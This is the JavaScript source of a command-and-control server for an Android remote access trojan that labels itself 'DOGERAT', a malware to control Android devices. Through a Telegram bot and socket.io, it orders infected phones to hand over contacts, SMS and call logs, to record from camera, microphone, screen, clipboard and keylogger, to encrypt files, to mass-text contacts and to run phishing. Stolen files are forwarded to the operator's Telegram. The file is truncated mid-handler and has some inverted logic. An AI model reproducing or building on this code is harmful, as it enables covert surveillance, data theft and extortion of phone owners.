const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require("fs");

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, {
  polling: true,
  request: {}
});

const appData = new Map();
const actions = [
  "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", 
  "✯ 𝚂𝙼𝚂 ✯", 
  "✯ 𝙲𝚊𝚕𝚕𝚜 ✯", 
  "✯ 𝙰𝚙𝚙𝚜 ✯", 
  "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", 
  "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯", 
  "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", 
  "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯", 
  "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", 
  "✯ 𝚃𝚘𝚊𝚜𝚝 ✯", 
  "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", 
  "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯", 
  "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", 
  "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯", 
  "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", 
  "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯", 
  "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", 
  "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯", 
  "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", 
  "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯", 
  "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", 
  "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯", 
  "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", 
  "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯", 
  "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"
];

app.post("/upload", uploader.single("file"), (req, res) => {
  const fileName = req.file.originalname;
  const host = req.headers.host;
  
  bot.sendDocument(data.id, req.file.buffer, {
    caption: "<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + host + "</b>",
    parse_mode: "HTML"
  }, {
    filename: fileName,
    contentType: "*/*"
  });
  
  res.send("Done");
});

app.get("/text", (req, res) => {
  res.send(data.text);
});

io.on("connection", socket => {
  let model = socket.handshake.headers.host + "-" + io.sockets.sockets.size || "no information";
  let version = socket.handshake.headers.version || "no information";
  let ip = socket.handshake.headers.ip || "no information";
  
  socket.model = model;
  socket.version = version;
  
  let connectionMessage = "<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + 
    ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + model + "\n") + 
    ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + version + "\n") + 
    ("<b>𝚒𝚙</b> → " + ip + "\n") + 
    ("<b>𝚝𝚒𝚖𝚎</b> → " + socket.handshake.time + "\n\n");
  
  bot.sendMessage(data.id, connectionMessage, {
    parse_mode: "HTML"
  });
  
  socket.on("disconnect", () => {
    let disconnectMessage = "<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + 
      ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + model + "\n") + 
      ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + version + "\n") + 
      ("<b>𝚒𝚙</b> → " + ip + "\n") + 
      ("<b>𝚝𝚒𝚖𝚎</b> → " + socket.handshake.time + "\n\n");
    
    bot.sendMessage(data.id, disconnectMessage, {
      parse_mode: "HTML"
    });
  });
  
  socket.on("message", message => {
    bot.sendMessage(data.id, "<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + model + "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>" + message, {
      parse_mode: "HTML"
    });
  });
});

bot.on("message", msg => {
  if (msg.text === "/start") {
    bot.sendMessage(data.id, "<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\n" + 
      "DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n" +
      "𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n" + 
      "𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } else if (appData.get("currentAction") === "microphoneDuration") {
    let duration = msg.text;
    let target = appData.get("currentTarget");
    
    if (target == "all") {
      io.sockets.emit("commend", {
        request: "microphone",
        extras: [{ key: "duration", value: duration }]
      });
    } else {
      io.to(target).emit("commend", {
        request: "microphone",
        extras: [{ key: "duration", value: duration }]
      });
    }
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    
    bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } else if (appData.get("currentAction") === "toastText") {
    let toastText = msg.text;
    let target = appData.get("currentTarget");
    
    if (target == "all") {
      io.sockets.emit("commend", {
        request: "toast",
        extras: [{ key: "text", value: toastText }]
      });
    } else {
      io.to(target).emit("commend", {
        request: "toast",
        extras: [{ key: "text", value: toastText }]
      });
    }
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    
    bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } else if (appData.get("currentAction") === "smsNumber") {
    let phoneNumber = msg.text;
    appData.set("currentNumber", phoneNumber);
    appData.set("currentAction", "smsText");
    
    bot.sendMessage(data.id, "<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 " + phoneNumber + "</b>\n\n", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });
  } else if (appData.get("currentAction") === "smsText") {
    let smsMessage = msg.text;
    let phoneNumber = appData.get("currentNumber");
    let target = appData.get("currentTarget");
    
    if (target == "all") {
      io.sockets.emit("commend", {
        request: "sendSms",
        extras: [
          { key: "number", value: phoneNumber },
          { key: "text", value: smsMessage }
        ]
      });
    } else {
      io.to(target).emit("commend", {
        request: "sendSms",
        extras: [
          { key: "number", value: phoneNumber },
          { key: "text", value: smsMessage }
        ]
      });
    }
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    appData.delete("currentNumber");
    
    bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } else if (appData.get("currentAction") === "vibrateDuration") {
    let duration = msg.text;
    let target = appData.get("currentTarget");
    
    if (target == "all") {
      io.sockets.emit("commend", {
        request: "vibrate",
        extras: [{ key: "duration", value: duration }]
      });
    } else {
      io.to(target).emit("commend", {
        request: "vibrate",
        extras: [{ key: "duration", value: duration }]
      });
    }
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    
    bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚙 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } else if (appData.get("currentAction") === "textToAllContacts") {
    let message = msg.text;
    let target = appData.get("currentTarget");
    
    if (target == "all") {
      io.sockets.emit("commend", {
        request: "smsToAllContacts",
        extras: [{ key: "text", value: message }]
      });
    } else {
      io.to(target).emit("commend", {
        request: "smsToAllContacts",
        extras: [{ key: "text", value: message }]
      });
    }
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    
    bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } else if (appData.get("currentAction") === "notificationText") {
    let notificationText = msg.text;
    appData.set("currentNotificationText", notificationText);
    
    let target = appData.get("currentTarget");
    let url = ""; // URL would be set elsewhere
    
    if (target == "all") {
      io.sockets.emit("commend", {
        request: "popNotification",
        extras: [{ key: "text", value: notificationText }]
      });
    } else {
      io.to(target).emit("commend", {
        request: "popNotification",
        extras: [
          { key: "text", value: notificationText },
          { key: "url", value: url }
        ]
      });
    }
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    appData.delete("currentNotificationText");
    
    bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } else if (msg.text === "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
        parse_mode: "HTML"
      });
    } else {
      let devicesMessage = "<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : " + io.sockets.sockets.size + "</b>\n\n";
      let deviceCount = 1;
      
      io.sockets.sockets.forEach((socket, id, set) => {
        devicesMessage += "<b>𝙳𝚎𝚟𝚒𝚌𝚎 " + deviceCount + "</b>\n" + 
          ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + socket.model + "\n") + 
          ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + socket.version + "\n") + 
          ("<b>𝚒𝚙</b> → " + socket.ip + "\n") + 
          ("<b>𝚝𝚒𝚖𝚎</b> → " + socket.handshake.time + "\n\n");
        deviceCount += 1;
      });
      
      bot.sendMessage(data.id, devicesMessage, {
        parse_mode: "HTML"
      });
    }
  } else if (msg.text === "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
        parse_mode: "HTML"
      });
    } else {
      let deviceButtons = [];
      io.sockets.sockets.forEach((socket, id, set) => {
        deviceButtons.push([socket.model]);
      });
      deviceButtons.push(["✯ 𝙰𝚕𝚕 ✯"]);
      deviceButtons.push(["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]);
      
      bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: deviceButtons,
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  } else if (msg.text === "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯") {
    bot.sendMessage(data.id, "<b>✯ If you want to hire us for any paid work please contact @sphanter\n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CUBERSHIELDX\nADMIN → @SPHANTER</b>\n\n", {
      parse_mode: "HTML"
    });
  } else if (msg.text === "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯") {
    bot.sendMessage(data.id, "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } else if (msg.text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
    let targetModel = io.sockets.sockets.get(appData.get("currentTarget")).model;
    if (targetModel == "all") {
      bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
            ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"],
            ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
            ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"],
            ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"],
            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
            ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
            ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
            ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
            ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
            ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"],
            ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"],
            ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else {
      bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + targetModel + "</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
            ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"],
            ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
            ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"],
            ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"],
            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
            ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
            ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
            ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
            ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
            ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"],
            ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"],
            ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  } else if (actions.includes(msg.text)) {
    let target = appData.get("currentTarget");
    
    // Handle Contacts action
    if (msg.text === "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
      if (target == "all") {
        io.sockets.emit("commend", { request: "contacts", extras: [] });
      } else {
        io.to(target).emit("commend", { request: "contacts", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle SMS action
    if (msg.text === "✯ 𝚂𝙼𝚂 ✯") {
      if (target == "all") {
        io.to(target).emit("commend", { request: "all-sms", extras: [] });
      } else {
        io.sockets.emit("commend", { request: "all-sms", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Calls action
    if (msg.text === "✯ 𝙲𝚊𝚕𝚕𝚜 ✯") {
      if (target == "all") {
        io.sockets.emit("commend", { request: "calls", extras: [] });
      } else {
        io.to(target).emit("commend", { request: "calls", extras: [] });
      }
      appData.delete("currentTarget");
